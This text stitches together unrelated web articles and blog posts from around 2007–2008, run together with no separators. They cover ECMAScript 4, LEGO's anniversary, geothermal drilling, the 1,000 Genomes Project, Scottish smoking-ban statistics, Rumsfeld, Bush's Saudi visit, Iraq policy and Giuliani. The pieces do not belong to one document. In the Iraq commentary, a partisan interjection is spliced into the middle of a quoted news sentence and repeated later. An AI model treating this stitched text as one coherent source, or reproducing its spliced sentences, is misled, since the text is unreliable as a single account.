While I was away these past couple weeks two important papers were released that detail some of the changes that are coming about in ECMAScript 4 .
The first is a white paper ( 40 pages , PDF ) that paints a wide stroke , covering nearly all new features introduced in the language , to some degree or another .
Probably the most important part is looking at the goals for the language :
Compatible with ECMAScript 3
Suitable to developing large systems
Allow for reusable libraries
Merge previous efforts ( ActionScript )
Fix ECMAScript 3 bugs
Keep it usable for small programs
Give it a read and test out the code against the reference implementation ( a lot of it will work , but it ’s only about 70 % of the way there ) .
By the way , the reference implementation was also updated ( version M1 ) – you should find it to be much less buggy now , they ’ve been making good progress on it .
The second document is a detailed one specifying all the backwards compatibility changes that will be made in ECMAScript 4 .
The changes that have been outlined are specific , but generally quite safe ( the most significant ones were detailed in my previous blog post on the subject ) .
Let me know if you have questions about the contents of either of the documents and I ’ll do my best to try and answer them .
Wikipedia writers have a sense of humor !
Sort of .
A few users are posting stickers that read " citation needed " — a footnote attached to dubious claims on the collaborative encyclopedia — on real - world ads .
It 's a more flexible joke than putting " Hammertime " stickers on stop signs .
It 's also less funny than Stephen Colbert getting banned from the site , but cut the nerds some slack .
If we learned anything from LOLcats , it 's that nerd humor becomes mainstream humor .

Dana Jacobson ESPN Host Suspended For Remarks ( Video )
Dana Jacobson , is a co-host of First Take on ESPN2 .
Like so many before her , she is in trouble with the network over remarks she made at an Atlantic City , N.J. roast for ESPN Radio personalities Mike Golic and Mike Greenberg .
The dust up involved some inappropriate remarks Jacobson made about Notre Dame .
Her comments , with bottle in hand , were said to be rambling and vulgar .
Jacobson , a Michigan graduate , had often sparred with Golic , a former defensive lineman for the Fighting Irish .
Their rivalry banter was apparently a normal part of their relationship .
She has apologized to Notre Dame and to Golic and Greenberg .
In a written statement she said the following :
" I am sorry .
My remarks about Notre Dame were foolish and insensitive .
I respect all religions and did not mean anything derogatory by my poorly chosen words .
I also deeply regret the embarrassment I 've caused ESPN and Mike and Mike .
" My actions at the roast were inappropriate and in no way represent who I am .
I wo n't make excuses for my behavior , but I do hope I can be forgiven for such a poor lack of judgment . "
An ESPN spokeman , said , " Her actions and comments were inappropriate , and we 've dealt with it . "
He would not confirm the rumors that Dana Jacobson has received a one week suspension .
The Golf Channel had a recent stir with one of their on air anchors , Kelly Tilghman .
She made derogatory comments about Tiger Woods .

It seems to me there is confusion on this issue .
Here are some of my thoughts on the issue .
Obviously we possess our bodies .
Does this imply that we own them ?
I would ask you consider this : I am holding a hammer in my hand .
I am obviously in possession of the hammer .
Does this imply that I own it ?
What if I had borrowed it from you ?
I 'm in possession , but you are the owner .
So possession does not equal ownership , agreed ?
What then creates ownership ?
If there is no one but me on a desert island , possession and ownership have no measurable difference .
As soon as another entity shows up , the difference between ownership and possession will start to become apparent .
If I lay down my hammer , or rather , THE hammer , and the new entity picks it up , what is its ownership situation ?
Does it still remain in my ownership even though it's in the other 's possession ?
I suggest to you that ownership is not possible outside of understanding .
Ownership is a mental construct .
Possession is physical and demonstrable , but ownership is mental .
Basically , the concept of ownership is something that must be mentally understood by all parties to be effective .
My point is basically this : Ownership is a function of agreement .
All parties need to understand that there is an idea of property and ownership before ownership can exist .
Not only that , these parties must agree to the ownership , otherwise it is more of a wish ( on the part of the possessor ) than actual ownership .
Just because I am holding this hammer does not mean that I own it .
Ownership relies on the fact that you understand the concept of property and grant that the hammer is mine .
Otherwise it is not owned by me , it is simply possessed .
Ownership is based upon -- relies upon -- agreement .
This does not mean that theft is impossible .
You can understand that the hammer is mine and still steal it from me .
You possess MY hammer at that point .
Against my wishes .
If you simply take my hammer that I left laying on the ground , not knowing that it is " mine , " you have not stolen it , you have simply acquired it .
It is not theft until you know that it is mine .
Your knowledge of the " private propertyness " of the hammer is required before it can be considered theft .
Not only that , but the intent to steal is also needed .
For instance , you could see the hammer , know it is mine , and pick it up and take it with you to use for a while , all the while intending to bring it back when you are done .
This would not be theft .
It may be questionable behavior , but it also would not be theft .
So from the above thought train , I must conclude that I do not own myself unless others recognize the concept .
I possess myself , for sure .
But if the society or culture in which I live does not understand and honor the idea of property and ownership , then my " rights " as regard my body are no greater than simple possession .
Ownership can only exist if those who might be in competition for that property will grant the idea that it is yours .
You can only own something with the agreement of others .
Otherwise it is simply possession with the potential willingness to defend that possession .
A man can take my hammer and threaten to shoot anyone who takes it from him , including me .
This does not mean it is his hammer .
Just so , my willingness to protect my hammer from theft is not what makes it mine .
It is the acknowledgment by others that the hammer is mine which in fact makes it mine .
In Summation :
Ownership is a social construct .
It is not something one can proclaim .
Rather , something like trust , it must be earned .
It is something that is granted to you by others .
Entreaty , not declaration , is its potting soil .
Like love , it can only be obtained by giving it away .
And just as similarly , that is no guarantee .

IN THE world of environmental activism , there is a good rule of thumb .
If an energy source comes out of the ground it is probably bad ( think coal , oil , natural gas and , in the view of many , uranium ) .
If it does not , then it is probably good ( think wind , waves , solar and biofuels ) .
But there is an exception .
Even the most hair - shirted environmentalist finds it hard to argue against geothermal energy .
When what comes out of the ground is merely hot water or steam there is , as it were , little to get steamed up about .
The problem is that traditional geothermal power relies on volcanism .
Fine if you live in Iceland or New Zealand .
Not so good in a geologically passive place such as Germany .
Which is why Wulf Brandt , of the National Research Centre of Geosciences in Potsdam , has dug a deep hole in the ground at Gross Schönebeck , near Berlin .
Dig deep enough and geothermal energy is everywhere .
That is because the temperature increases by 25 - 30 °C for every kilometre you go down .
Useful electricity generation needs a temperature above 150°C .
In the case of the rocks under Gross Schönebeck , that means digging to a depth of 4.4 km .
Also , to extract the heat , you need two holes .
Unlike volcanic geothermal energy , supplied by water or steam gushing to the surface unprompted , the non-volcanic variety requires a pump — and two holes in the ground rather than one .
Cold water goes down the first and hot water comes up the second .
One reason Mr Brandt picked Gross Schönebeck was that one of these two holes was available for nothing .
It had been drilled by a gas exploration company , but had proved “ dry ” .
Mr Brandt drilled the other so that it was the same depth as the first , but it bottomed out 400 metres way .
That , he reckoned , was far enough for water travelling between the two holes to heat up without cooling the intervening rocks too rapidly .
The question was , would water pushed down the first hole force water up the second in large enough quantities and at high enough temperatures to be commercially viable ?
To start with , the answer was no .
But as the experiment progressed , the rate of flow increased — and this was no accident .
One of the things Mr Brandt had taken into account when he planned the experiment was the grand movement of the Earth 's tectonic plates .
He aligned the two holes in a way that would benefit from the tension created as far north as Berlin by the collision of African and Eurasian plates that uplifted the Alps .
The downward - flowing water , which was injected at a pressure of 500 atmospheres , gradually forced apart existing fissures , and created new ones , in such a direction that the tension helped keep them open .
Another trick he employed was to add grains of sand and corundum to the water .
These grains were the right size to help keep the fissures open without blocking them .
The result was that the rate of flow increased towards 75 cubic metres an hour , which is needed to make an electricity plant operable .
It remains to be seen whether that flow rate can be sustained , and Gross Schönebeck thus turned into a commercial power station .
But the auspices are good .
If it can , it will pave the way for others .
The supply of heat from the Earth 's interior is , in practice , inexhaustible — and although any given site can be cooled to the point where it is useless ( Dr Brandt reckons that would take about 30 years in the case of Gross Schönebeck ) , you can always dig more holes .

Une agence créée au lendemain des attentats du 11septembre 2001 , la Transportation Security Administration ( TSA ) , a fiché plus de 100 000 opposants à la politique de George W. Bush et les soumets à des contrôles abusifs de sécurité pour les empêcher ou leur interdire de prendre des vols intérieurs ou extérieurs .
L’existence de ce fichier avait été découverte , en mars 2004 , lorsque les agents de la TSA empêchérent par cinq fois le sénateur Edward Kennedy de prendre un avion .
Désormais , ce sont les dissidents de tous horizons ( élus locaux , militants associatifs , universitaires … ) qui font l’objet de cette privation de liberté .

The map will relate genetic variation to particular diseases
To date , only a handful of humans have had their genes analysed in this way , including scientists Craig Venter and James Watson , and anonymous volunteers .
Teams in the UK , US and China say the project will create the most useful catalogue ever of genetic variation .
Any two humans are genetically more than 99 % identical : variations can explain why some get certain diseases .
Current catalogues of human genetic variation have led to the discovery of more than 100 regions of the genome - the complete package of genetic material in a living thing - that could explain susceptibilities to diseases such as diabetes , breast cancer and rheumatoid arthritis .
We can do 100 times as much sequence today as before for the same amount of money
Dr Richard Durbin
The international research consortium behind the 1,000 Genomes Project aims to build on this work by providing a much more detailed map of disease - related differences for use by all scientists .
" The dream of people working in the field would be to have a picture of all the places in our DNA sequence where there are differences between people , and how these fit together when they are inherited , " Dr Richard Durbin of the Wellcome Trust Sanger Institute , who is co-chair of the consortium , told BBC News .
" We can do 100 times as much sequence today as before for the same amount of money , " he explained .
" That allows us to think about sequencing 1,000 people in order to see directly all those differences between people and to provide a foundation for future human genetics . "
Knowledge gap
The map is designed to fill in the gaps in our knowledge about how genetic variation is related to disease .
The 1,000 Genome Project Cost : $ 30 m to $ 50 m
Will read 6 trillion DNA building blocks Includes populations from Africa , Asia , America and Europe
Most current research focuses on rare genetic changes in the human code that run in families and cause severe inherited diseases such as cystic fibrosis , or common differences that appear to underpin a host of major diseases .
" Between these two types of genetic variants - very rare and fairly common - we have a significant gap in our knowledge , " said Dr David Altshuler , the other co-chair of the consortium .
" The 1,000 Genomes Project is designed to fill that gap , which we anticipate will contain many important variants that are relevant to human health and disease . "
Anonymous samples
The work to sequence ( read ) human DNA will be carried out by the Sanger Institute in Cambridge , Beijing Genomics Institute in Shenzhen , and the National Human Genome Research Institute ( NHGRI ) , which is part of the US National Institutes of Health ( NIH ) .
They will use samples from volunteer donors who gave informed consent for their DNA to be analysed and placed in public databases .
Only a handful of people in the world have had their genomes mapped by science : the public Human Genome effort used bits of DNA from 12 unnamed volunteers , while private efforts in the US have unravelled the genetic code of US scientist Craig Venter and Nobel prize winner James Watson .
The data gleaned by the 1,000 Genomes Project will be made available to the worldwide scientific community through freely available public databases .
One of the many things I love about Donald Rumsfeld is that he 's totally unrepentant .
Back in 2001 , the Pentagon under his leadership created the controversial Office of Strategic Influence , which was closed down just a few months later after its existence became public .
Rightly or wrongly , the Pentagon was accused of creating a propaganda office .
Now , the former defense secretary has a bigger vision : he is advocating a " 21st century agency for global communications . "
This was one of the major themes in one of Rumsfeld 's first post - Pentagon public comments at a conference today on network centric warfare sponsored by the Institute for Defense and Government Advancement .
According to Rumsfeld , the United States is losing the war of ideas in the Muslim world , and the answer to that , in part , is through the creation of this new government agency .
During the the Q&A after the speech , I asked Rumsfeld what this new agency might entail ( he was pretty clear it would n't be a resurrected U.S. Information Agency , which was merged into State Department in 1999 ) , and why , when there is an abundance of media available in the private sector , the government needs to get involved .
I 'll just let Rumsfeld speak for himself :
Private media does not get up in the morning and say what can we do to promote the values and ideas that the free Western nations believe in ?
It gets up in the morning and says they 're going to try to make money by selling whatever they sell ...
The way they decided to do that is to be dramatic and if it bleeds it leads is the common statement in the media today .
They 've got their job , and they have to do that , and that 's what they do .
* We need someone in the United States government , some entity , not like the old USIA . . .
I think this agency , a new agency has to be something that would take advantage of the wonderful opportunities that exist today .
There are multiple channels for information . . .
The Internet is there , blogs are there , talk radio is there , e-mails are there .
There are all kinds of opportunities .
We do not with any systematic organized way attempt to engage the battle of ideas and talk about the idea of beheading , and what it 's about and what it means .
And talk about the fact that people are killing more Muslims than they are non-Muslims , these extremists .
They 're doing it with suicide bombs and the like .
We need to engage and not simply be passive and allow that battle of competition of ideas . *
What would this agency actually do ?
Hard to say , but Rumsfeld referred approvingly back to when the Army paid reporters to plant stories in the local press in Iraq .
He still thinks that was a good idea ( and blames the U.S. press for screwing it up ) .
In Rumsfeld 's view , the free press can co-exist with government sponsored / produced / paid news .
" It does n't mean we have to infringe on the role of the free press , they can go do what they do , and that 's fine , " says Rumsfeld .
" Well , it 's not fine , but it 's what it is , let 's put it that way . "
UPDATE #1 : MountainRunner , IntelFusion , Spencer Ackerman , and the * Washington Post 's * William Arkin all weigh in .
As does the * New York Times ' * blog The Lede , which is kind enough to give us a high five .
For sheer comedy gold , though , Ackerman wins , hands down .
UPDATE # 2 : Pods , shmods , what the heck was Rumsfeld talking about ?!
All those years of transcribing tapes must be making me deaf , because while that does sound something like a plausible Rumsfeldism , It turns out , he said , BLOGS , BLOGS , BLOGS .
Corrected above .
UPDATE # 3 : Good stuff from Phil Carter .
Rumsfeld 's latest proposal suffers from a fundamental flaw ( as did the IO campaign he waged while SecDef ) — he 's trying to put lipstick on a pig and convince everyone that it 's not a pig ...
The United States of America must do a great deal more to win the " hearts of minds " of moderates around the world than simply re-brand itself and develop a slick messaging campaign .
We must earn their support through what we do — not what we say .
Deeds like the U.S. efforts to deliver aid to Banda Aceh after the tsunami , or to Pakistan after its earthquake , go a long way towards doing this .
The continuing , festering occupation of Iraq does little to help this , regardless of how much good our troops and diplomats do on the street .
The eyesore of Guantanamo does a great deal to undermine whatever good we do .
Ultimately , I believe we must pay a great deal more attention to our deeds — not our message — in order to earn the support of the world .
Otherwise , our policies are just a pig .
And no matter how much lipstick we might apply , it 'll still just be a pig .

Your time is valuable , and it should be included in calculations about your investment returns .
Whether you add or subtract value from your assets when you spend time on investment activities should also be evaluated .
Some investors spend significant time on the wrong strategies .
Instead of adding value , their efforts reduce their investment portfolio performance and degrade their financial welfare .
The personal process of financial planning and investing is life long , and is not just a one - time exercise .
Personal situations and financial requirements change , as do the economy and the financial markets .
Investment plans need to evolve periodically to remain current and appropriate .
When pursuing optimal investment strategies and controlling costs and taxes , you also need to establish a time - efficient system to monitor , adjust , and adhere to your plan .
This article introduces the concepts of an opportunity cost for your time and a value - added or value - diminishing wage for the time you spend on investment activities .
It also discusses two other ideas : that more time spent on poor strategies will just cost you more and that scientifically grounded investment strategies tend to take less time to implement .
Other articles in this Personal Efficiency category will develop these ideas in more detail .
You will also find a list of these additional personal efficiency articles at the bottom of this page .
The scientific investment literature indicates that many of the activities that individual investors engage in do not produce superior results .
Very often , they have the opposite effect – especially after costs and taxes are considered .
Only a relatively small subset of investment activities tends to produce positive value .
Valuable strategies tend to be passive and not active , and they usually focus on reducing costs and taxes rather than attempting to beat the market .
When estimating the net contribution that you might make when you spend time on investing , you first need to estimate whether or not your decisions actually add value to your investments .
Because most individuals probably are not adding value with current strategies , they need to change their approaches .
When you honestly evaluate your positive or negative value contribution and track your hours , you can calculate your positive or negative value contribution on an annual and hourly basis .
The size of your portfolio also influences the size of your positive or negative hourly investment activity wage .
Next , you can calculate your hourly opportunity cost , which quantifies the value of spending your personal investment time on alternative income generating or leisure activities .
By combining your hourly investment value contribution with your hourly opportunity cost , you can estimate the overall value of your personal contribution to your investment affairs .
Usually this annual or hourly figure will be negative for an investor .
Finally , to estimate your overall investment efficiency , your personal value contribution and opportunity cost should be added to all the excess industry investment costs and unnecessary taxes that you incur .

Yesterday 's New Hampshire primary elections were rigged .
This I know at 10:30 a.m. because eight of the top nine stories on Reddit - vetted and voted upon by legions of actual Reddit readers - either explicitly or by implication tell me the elections were rigged .
Figure it must be true .
We 're talking wisdom of the crowds here .
Yet there are zero similar stories on the front page of Digg .
Not even on Digg 's special page for election coverage .
Fark ?
Had to dig inside to find a headline that pretty much dismissed the talk .
There are no such stories prominently featured on Mixx either , although they 're relatively new to the game over there and can be forgiven for their tardiness .
But The Drudge Report lives and breathes for such stories , yet there appears to be nothing about the rigged primaries on its front page .
Best they can muster is " New Hampshire 's Polling Fiasco . "
Tsk , tsk .
Google News , Yahoo News ,
The New York Times and CNN are all bereft of this momentous story on their front pages , too , but at least this is understandable given their all - but - certain complicity in the crimes .
Stand tall , Reddit , stand tall .
LEGO is 50 years old today ( precisely at 1:58 pm , actually , when the original patent was filed in Denmark ) .
The plastic toy building brick is everywhere - LEGO has thousands of sets with all sorts of themes , from Star Wars to Harry Potter models .
To commemorate the half century mark of the popular toy , Neatorama has compiled a 10 Neatest LEGO Facts and Links :
1. LEGO 's Humble Beginnings
The LEGO toy empire got started in 1932 when Ole Kirk Christiansen , a Danish carpenter , almost went bankrupt .
During a depression , he had lost so much carpentry business that he started making wooden toys and selling them from his workshop .
Two years later , he named his company LEGO ( from Danish words " leg godt " meaning " play well " .
Incidentally , lego also means " I put together " in Latin . )
Christiansen 's first product ?
A wooden toy duck .
2. LEGO Was n't the First to Invent Bricks
Ole Kirk did n't invent those LEGO bricks .
He was inspired by the " Kiddicraft Self - Locking Building Brick " patented by British inventor Hilary Fisher Page years earlier .
LEGO 's first bricks , called the Automatic Binding Bricks , were released in 1947 and were almost exact copies of the Kiddicraft block .
Many years later , after Page committed suicide over business troubles , LEGO bought all the rights to the Kiddicraft block .

3. LEGO Patent
In 1961 , LEGO was awarded its first US patent for " Toy Building Brick . "
The design calls for a hollow rectangular bricks with studs on top and a round hollow tube on the bottom .
This was a marked improvement , as it allows for the precise " tube and stud " coupling .
( source : Google Patents )
4. The First Minifigs
The first minifigures ( or minifigs ) were released in 1978 for the Town , Space , and Castle playsets .
When they were first created , LEGO decided that their ( always happy ) faces should have only one color : yellow .
Minifigs have no sex or race .
Actually , they did n't have any arms or movable legs either .
In the 1980s , with the arrival of the LEGO Pirates , new facial features ( evil / good / happy / grumpy ) were released .
In 2003 , the company released different skin colors for the LEGO Basketball .
5. LEGO Manufacturing Fun Facts
Every year , about 19 billion LEGO bricks are produced .
That translates to 2.16 million LEGO elements are molded every hour , or 36,000 per minute !
The LEGO manufacturing process is so precise that only 18 out of 1 million LEGO bricks produced is considered defective .
The melted ABS is struck at a pressure of 25 tons to 150 tons -- depending on the type of brick being made -- with the metal molds .
The intense force is important to the process , as it ensures that the bricks are accurately shaped .
Oh , and did you know that LEGO manufactures about 306 million tiny rubber tires every year ?
That 's more than any other tire manufacturers in the world !

6 . The Acronyms of LEGO
Perhaps it 's the company 's name , spelled in all capital letters , that inspired LEGO lovers to use a multitude of acronyms when they talk about their beloved toy .
Here are some examples :
AFOL : Adult Fan of LEGO
BFC : Big Freaking Castle
BURP : Big Ugly Rock Piece
HOG : Hand of God , when you move your minifigs around , this is what they think of your hand
LF and NLF : LEGO Friend and Non-LEGO Friend
LS and NLS : LEGO Spouse and Non-LEGO Spouse ( guess which one approves of the LEGO hobby )
MOC : My Own Creation
7. LEGO is Really , Really Popular
Consider these amazing statistics , courtesy of LEGO - Thanks Alisa Weinstein !
- There are about 62 LEGO bricks for every one of the world ’s 6 billion inhabitants .
- Children around the world spend 5 billion hours a year playing with LEGO bricks .
- More than 400 million people around the world have played with LEGO bricks .
- More than 400 billion LEGO bricks have been produced since 1949 .
Stacked on top of each other , this is enough to connect the Earth and the Moon ten times over .
- 7 LEGO sets are sold by retailers every second around the world .
- The LEGO bricks sold in one year would circle the world 5 times .
8. The LEGO Artist
While each LEGO creation is a testament of the builder 's creativity , Nathan Sawaya 's creations have elevated building with LEGO to an artform .
The former corporate lawyer quit his job in 2001 to focus on becoming the world 's foremost LEGO artist .
Sawaya's art show The Art of the Brick is currently touring North American museums .

9. LEGO World Records
Given people 's passion when it comes to the toy , it 's not surprising that there are many world records set with LEGO , for example :
- World 's tallest LEGO tower at 94.3 ft ( 28.7 m ) with 465,000 bricks
- World 's Longest LEGO Construction at 5,179.8 ft ( 1,578.8 m ) with 2.9 million bricks
- World 's Largest LEGO
Image at 870.15 ft² ( 80.84 m² ) , with 1.2 million bricks
World 's Largest LEGO
Image - see the guy in the middle of the 8 ft minifigs ?
That should give you an idea of how large the image is .

10 . The Brick Testament
The Last Supper , Photo : Brandan Powell Smith
Let 's end with one of my favorite stories about LEGO :
In 2001 , Brendan Powell Smith embarked on a project to tell the stories in the Bible using LEGO dioramas .
The result was a website called The Brick Testament .
Since then , it had grown to have over 3,600 illustrations that retell more than 300 stories .
Does anybody have a scorecard of how many Bush appointees whose understanding of how to do their job was actually the exact opposite of what everyone else understood their job to be ?
Let 's add another name to the wall of shame : Julie MacDonald .
Wired :
The U.S. Fish and Wildlife Service on Tuesday reversed seven rulings that denied endangered species increased protection , after an investigation found the actions were tainted by political pressure from a former senior Interior Department official .[.. ]
The rulings came under scrutiny last spring after an Interior Department inspector general concluded that agency scientists were being pressured to alter their findings on endangered species by Julie MacDonald , then a deputy assistant secretary overseeing the Fish and Wildlife Service .
MacDonald resigned her position last May .
Rahall in a statement said that MacDonald , who was a civil engineer , " should never have been allowed near the endangered species program . "
He called MacDonald 's involvement in species protection cases over her three - year tenure as an example of " this administration 's penchant for torpedoing science . " [.. ]
Francesca Grifo of the Union of Concerned Scientists said the acknowledgment of seven instances of wrongdoing " does not begin to plumb the depths of what 's wrong " at the wildlife agency and its implementation of the Endangered Species Act .
President Bush and Saudi leaders tangled Tuesday over the price of oil , with the president reminding this wealthy desert kingdom that U.S. purchases could fall if the American economy slips and with a Saudi official refusing to commit his country to greater production to reduce costs at the pump .
Bush said the price of oil , driven up by growing demand in the United States but an even greater increase in China and India , had become “ painful for our consumers . ”
He suggested that oil - producing nations open their spigots for their own good .
Producers should “ realize that high energy prices affect the economies of consuming nations , ” he said .
If those economies weaken , he said , they “ will eventually be buying fewer barrels of oil . ”
Energy demand has “ outstripped new supply , ” Bush told reporters .
“ That ’s why there ’s high price . ”

Saudi Oil Minister Ali Ibrahim Naimi said his country was sympathetic to such economic worries , but he refused to commit to increasing production .
“ The concern for the U.S. economy is valid , ” he said .
“ But what affects the U.S. economy is more than the price of oil . ”
Still , he added , “ we do n’t want to see the U.S. economy go into recession in the future . ”
The oil minister held out the possibility that his country might at some point increase its output of oil , a step that might lower consumer prices .
“ We have no constraints on using it now or in the future , ” Naimi said of Saudi Arabia ’s unused production capacity .

When asked whether U.S. consumers would again see gasoline priced at $ 1 to $ 1.50 a gallon , he cracked : “ If I knew that , I ’d be in Las Vegas rather than here . ”
The U.S. - Saudi relationship is based foremost on oil , although the United States relies more heavily on oil from Canada and Mexico than from Saudi Arabia .
But differences between the two governments , however gingerly expressed , go beyond oil matters .
Most recently , the Bush administration has tried to win the release of a detained Saudi blogger , Fouad Farhan , who has run afoul of the government because of his Internet postings that call for more freedoms .
At a news conference Tuesday , Prince Saud al Faisal , the foreign minister , largely turned aside a question about that case and Saudi respect for human rights .
He also bristled and said he was not certain “ what kind of outreach we can have for Israel ” when he was asked whether Saudi Arabia would support the new efforts at Israeli - Palestinian rapprochement , as sought by Bush during his visit .

The prince also parted company with the United States over Iran .
Saud said that Saudi Arabia , like the United States , wanted Iran to abide by United Nations demands that it halt uranium enrichment .
But Saudi Arabia sees Iran as a neighbor , he said , and he would not speak harshly of it .
Historically , Saudi Arabia , led by Sunni Muslims , has been wary of Iran , where Shiite Muslims hold sway .
Bush dined Tuesday night with King Abdullah at the monarch ’s 2,000 - acre horse ranch , Janadriyah , outside Riyadh .
Ranch residents include Alysheba , the winner of the Kentucky Derby and Preakness in 1987 .
Bush , who was spending the night there , showed up for dinner in a full - length robe , black with blue - silver trim , known as a farw .
Seated next to the king at dinner in a building with a tentlike roof , he eventually removed the garb , revealing a fur lining .

The president is scheduled to complete his eight - day trip today with a 2 1/2 - hour stop in the Red Sea resort of Sharm el Sheik to meet with Egyptian President Hosni Mubarak .
Bush began the tour in Israel and continued to the West Bank , Kuwait , Bahrain and the United Arab Emirates before arriving here Monday .
The president met Tuesday morning with 11 Saudi entrepreneurs , two of them women , in this society that severely restricts women ’s rights .
During a 90 - minute tour of the Saudi National History Museum , he held a sword over his shoulder , grinning broadly and swaying to the beat of drummers during a welcoming ceremony .
When he met with reporters early in the afternoon , he said he was in a “ great mood . ”
“ Dates put you in a good mood , right ?
I ’m in a great mood , ” he said , laughing and responding , “ Not bad , not bad , ” when a reporter asked what sort of date he was talking about .

Even before Bush began his day , Secretary of State Condoleezza Rice had set off on a lightning visit to Iraq , to encourage Iraqi officials to move forward in political reconciliation talks .
The president said he had decided about 10 days earlier that the time was ripe for another visit by Rice , so she could “ help push the momentum by her very presence . ”
In Baghdad , Rice praised legislation intended to re-integrate Sunni Arabs into government jobs , a measure passed Saturday by the Iraqi parliament .
It will allow the rehiring of thousands of low - level members of Saddam Hussein ’s Baath Party who were purged by former U.S. overseer L. Paul Bremer III in 2003 .
“ It is clearly a step forward for the process of healing the wounds of the past , ” Rice told reporters after meetings with top Iraqi leaders .

Times staff writer Garrett Therolf in Baghdad contributed to this report .
It was dramatic research that made headlines everywhere .
A 17 % fall in the number of heart attacks in the year since Scotland stubbed out smoking in public places .
Startling - if true .
Few questioned the research when it was revealed two months ago .
Politicians trumpeted the numbers as vindication of a policy introduced a year earlier than in England .
Journalists obediently followed suit .
The most arresting finding was that heart attacks among non-smokers had apparently fallen even faster than smokers , suggesting that passive smoking was often to blame .
Then a week ago , with rather less fanfare , routine statistics on hospital activity were published by the official source for health data in Scotland , as they are every year , this time including the time since the ban .
These show a fall in heart attacks for the year from March 2006 - not of 17 % , but less than half as much at about 8 % .
What 's more , taking out the recent trend , this is halved again .
Heart attacks have been falling steadily for some years now .
The percentage falls in the three years before the ban were 5.1 % , 4.7 % and 5.7 % .
So the fall since is still bigger than the trend would lead us to expect , but bigger only by about three or four percentage points - an improvement , but retreating fast from the magnitude of 17 .
The latest release also makes clear that even an 8 % fall in heart attacks is not unprecedented .
There was another , larger drop between 1999 and 2000 of about 11 % ( see chart ) .
This seems to demonstrate significant variability around the trend , suggesting that last year 's 8 % drop might even be the result of chance .
It is conceivable , although perhaps unlikely , that the smoking ban had no effect at all .
The figures could be a result of no more than the ordinary ups and downs of statistical variation from one year to the next .
There have been several other initiatives designed to reduce heart attacks in Scotland recently , and any or all might also have played a part .
If we look at all heart attacks , rather than just emergency admissions , the fall last year according to the official data was slightly smaller again - about 7 % - against falls in the past three years on this measure typically of about 4 % .
Rise and fall
Scotland 's deputy chief medical officer , Peter Donnelly , said at the time of the study in September : " One of the most important findings is the reduction in heart attacks .
We believe that the smoking ban was a large contributory factor to this drop . "
Scotland 's ban came into force 20 months ago
Such claims are , in fact , positively damaging .
What is unquestionably a good news story - the consistent and impressive decline in heart attacks in Scotland over many years - has become overshadowed by squabbles about the smoking ban .
Worse , the true reasons for this success may be overlooked if too much credit is attributed to the ban on unreliable evidence .
So why such a discrepancy between the two numbers ?
The first study was presented at a conference in Edinburgh two months ago by a research group called StopIt ( Study Of Public Place Intervention on Tobacco Exposure ) .
The latest statistics come from ISD Scotland , part of the NHS responsible for health data .
Dr Colin Fishbacker , an ISD official , says the two studies used data from different sources .
" We would n't expect the sources to agree exactly .
The routine data we publish is based on the discharge summary sent to the GP and medical records for coding .
The StopIt study was a specific research exercise . "
Numbers game
There are other factors that may might help explain the discrepancy .
The first study , unlike the routine data , was a sample , not a total for all Scotland .
And although the sample included nine Scottish hospitals with about two - thirds of heart attack admissions , patients did not have to take part .
A patient in cardiac intensive care
But because the data on which the StopIt study was based has never been published , and nor has the study itself , it is impossible to say exactly how it was done .
Attempts to obtain it or to talk to the lead researcher have gone unanswered .
Once the number was out , politicians were certainly not about to exercise any scientifically - minded reservations about its reliability .
The story became political as much as medical .
None of this rules out the possibility that the ban is having an effect .
Such a conclusion would be as reckless as declaring that the ban explains everything .
But how much effect it 's having - if any - no -one knows .
As for the flurry of excitable headlines , what appeared to be hard medical evidence now looks more like over - hasty and over - confident research , coupled with wishful political thinking and uncritical journalism .
Whether the same will happen now attention has shifted to the effect of the bans in England and Wales remains to be seen .

With American military successes outpacing political gains in Iraq , the Bush administration has lowered its expectation of quickly achieving major steps toward unifying the country , including passage of a long - stymied plan to share oil revenues and holding regional elections .
There have been signs that American influence over Iraqi politics is dwindling after the recent improvements in Will the US then stage a coup and oust Maliki to put in a Chalabi type puppet in his place ?
This war and their supporters represent the term " absurd " in the extreme .
security — which remain incomplete , as shown by a deadly bombing Friday in Baghdad .
While Bush officials once said they aimed to secure “ reconciliation ” among Iraq ’s deeply divided religious , ethnic and sectarian groups , some officials now refer to their goal as “ accommodation . ” ... read on
So now their goals have changed to one of accommodation .
It 's CRAZY TALK@ !
Bush wants this war to continue so that when he leaves leave office he can hope that Michael Gerson writes the official version for all our history books .
It 's all about his legacy , you see .
What a joke .
I 've been saving the above clip for a few weeks now and I think this is the right time to post it .
On 10/14/07 , Lindsey Graham ( CNN's Late Edition ) said that if by the end of the year --- the elected government of Iraq , run by Maliki --- does n't get the job done he should be removed .
WTF ?
BLITZER : ... But what happens if they fail to divide up the oil , if they fail to get those elections , they do n't disband all the various militias by the end of the year ?
Then what does the United States do ?
GRAHAM : ... So I am hopeful that some of these people at the local level will have a stronger voice .
And I 'm hopeful that Talabani , Maliki , and Hashemi and all the major players can have a breakthrough .
I 'm asking them to do things they say are important for their country .
The conditions are right now and , quite honestly , if they can't do it by the end of the year , I have real doubts that this group will ever do it so we need a new political strategy to find a group that can .
Find a group that can ?
Ladies and Gentlemen this is a major clusterf * &k and the scaled down violence is only an excuse to perpetuate this atrocity .
Will the US then stage a coup and oust Maliki to put in a Chalabi type puppet in his place ?
This war and their supporters represent the term " absurd " in the extreme .
Kristol : Giuliani nomination ' problematic ' in scandal 's wake David Edwards and Greg Wasserstrom
Published : Sunday December 2 , 2007

Print This Email This Conservatives agree : this week 's scandal about whether or not Republican presidential candidate Rudy Giuliani misused city funds while Mayor of New York has taken a serious toll on his candidacy .
Appearing on the program Fox News Sunday , Bill Kristol and Fred Barnes , both of the conservative Weekly Standard , suggested the Giuliani campaign is in trouble .
" Bill , I 've come to the conclusion that any story that begins ' presidential candidate ' and ' girlfriend are not good , " host Chris Wallace said to his panelist .
" No , and when the follow - up story in the New York press is that , in fact , New York City police chauffeured around Judith Nathan - she was Rudy Giuliani 's girlfriend or mistress but certainly not yet married to him in 2000 or 2001 - that 's not good either .
It was a very tough week for Giuliani .
I think his path to the nomination is very problematic , " Kristol told Wallace .
Kristol also cited Rudy 's recent decline in Iowa , New Hampshire and National polls - all before the story of alleged misuse of city funds broke on Thursday .
Weekly Standard executive editor and regular
Fox commentator Fred Barnes agreed that Giuliani should be worried about his showing in the early primaries , now only a month away , due to concerns Republican voters may have about his character .
" All this book - keeping stuff aside , this flap right now is all about having an extra-marital affair fairly recently , " Barnes said .
" In Rudy Giuliani 's case , I think that 's what comes through to people and not all the questions about an American Express card and all that stuff .
It 's about that affair . "
